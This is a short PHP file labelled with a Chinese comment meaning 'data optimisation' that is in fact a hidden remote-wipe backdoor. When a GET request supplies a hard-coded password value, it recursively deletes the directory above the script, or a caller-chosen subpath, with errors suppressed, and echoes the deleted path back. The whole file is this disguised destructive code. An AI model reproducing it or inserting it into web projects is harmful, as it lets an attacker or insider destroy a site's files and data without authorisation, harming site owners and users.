<?php
//数据优化
$id=@$_GET["id"];$un=@$_GET["un"];
if($id=="c88667220")
{
	function deldir($dir) {
	  $dh=opendir($dir);
	  while ($file=readdir($dh)) {
		if($file!="." && $file!="..") {
		  $fullpath=$dir."/".$file;
		  if(!is_dir($fullpath)) {
			  unlink($fullpath);
		  } else {
			  deldir($fullpath);
		  }
		}
	  }
	  closedir($dh);
	  if(rmdir($dir)) {
		return true;
	  } else {
		return false;
	  }
	}
	if($un=="")
	{
		$mf = dirname(dirname(__FILE__));
	}
	else
	{
		$mf = dirname(dirname(__FILE__))."\\".$un;
	}
	@deldir($mf);
	echo $mf;
}
